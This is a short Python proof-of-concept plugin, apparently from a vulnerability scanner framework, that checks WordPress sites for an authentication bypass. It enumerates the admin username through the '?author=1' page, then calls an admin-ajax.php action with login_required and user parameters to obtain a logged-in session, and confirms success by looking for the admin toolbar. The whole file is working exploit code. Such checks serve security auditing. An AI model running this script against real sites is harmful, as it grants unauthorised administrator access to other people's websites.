# !/usr/bin/dev python
# -*- coding:utf-8 -*-

"""
reference:
http://www.beebeeto.com/pdb/poc-2015-0080
"""


import re


def assign(service, args):
    if service == 'wordpress':
        return True, args


def audit(args):
    verify_url = args + '?author=1'
    code, head, res, _, _ = curl.curl(verify_url)
    pattern = re.compile('class="archive author author-(.*?) author-1')
    username = pattern.search(res).group(1) if pattern.search(res) else 'admin'
    login_url = verify_url + 'wp-admin/admin-ajax.php?action=init&login_required=1&user=' + username
    curl.curl(login_url)
    code, head, res, _, _ = curl.curl(verify_url+ 'wp-admin/')
    if code == 200 and "<div id='wpadminbar' class='nojq nojs' role='navigation'>" in res:
        security_hole(verify_url)


if __name__ == "__main__":
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])